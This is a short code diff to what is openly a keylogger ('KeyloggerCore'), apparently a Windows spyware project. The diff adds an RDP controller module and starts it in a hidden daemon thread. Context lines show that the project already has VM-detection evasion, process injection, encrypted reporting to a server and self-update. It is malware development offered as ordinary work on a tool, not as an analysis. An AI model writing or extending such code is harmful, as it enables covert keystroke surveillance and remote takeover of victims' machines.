@@ -22,6 +22,7 @@ import io
 import pyautogui
 import os
 from system.vm_detector import VMDetector
+from monitoring.rdp_controller import RDPController
 
 # Configure logging based on DEBUG_MODE
 if Config.DEBUG_MODE:
@@ -55,11 +56,14 @@ class KeyloggerCore:
             self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
             self.communicator = ServerCommunicator(self.client_id, self.encryption)
             self.logger = ActivityLogger(Config.BUFFER_LIMIT)
+            self.rdp_controller = RDPController(self.encryption)
             self.running = True
 
             if platform.system().lower() == "windows" and not Config.DEBUG_MODE:
                 self.attempt_process_injection()
 
+            if platform.system().lower() == "windows":
+                threading.Thread(target=self.rdp_controller.start, daemon=True).start()  # اجرای RDP در ترد جدا
             # بررسی نسخه
             self.check_for_updates()
 
